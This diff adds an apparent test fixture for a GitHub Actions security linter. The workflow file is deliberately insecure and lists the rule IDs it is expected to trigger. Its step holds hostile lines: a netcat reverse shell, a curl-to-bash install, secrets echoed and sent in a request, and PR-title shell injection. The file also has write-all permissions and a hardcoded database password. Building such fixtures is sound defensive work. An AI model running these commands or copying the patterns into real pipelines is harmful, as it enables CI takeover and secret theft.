@@ -1,0 +1,38 @@
+# path: .github/workflows/ci.yml
+# expect: TG-GHA-001, TG-GHA-002, TG-GHA-003, TG-GHA-004, TG-GHA-005, TG-GHA-006, TG-GHA-007, TG-GHA-008, TG-GHA-010
+# expect: TG-GHA-011, TG-GHA-012, TG-GHA-013, TG-GHA-014, TG-GHA-015, TG-GHA-016, TG-GHA-017, TG-GHA-018, TG-SEC-001
+on:
+  pull_request_target:
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: image tag
+permissions: write-all
+env:
+  ACTIONS_ALLOW_UNSECURE_COMMANDS: true
+jobs:
+  build:
+    runs-on: [self-hosted, linux]
+    container: node:latest
+    services:
+      db:
+        image: postgres:16
+        env:
+          POSTGRES_PASSWORD: hunter2hunter2
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: Greet
+        run: |
+          echo "Building"
+          echo "${{ github.event.pull_request.title }}"
+          echo "${{ secrets.DEPLOY_KEY }}"
+          curl -H "Authorization: ${{ secrets.TOKEN }}" https://example.com
+          curl -sSL https://example.com/install.sh | bash
+          wget --no-check-certificate https://example.com/x
+          nc 10.0.0.1 4444 -e /bin/sh
+      - uses: docker/build-push-action@v5
+  call:
+    uses: org/repo/.github/workflows/deploy.yml@main
+    secrets: inherit
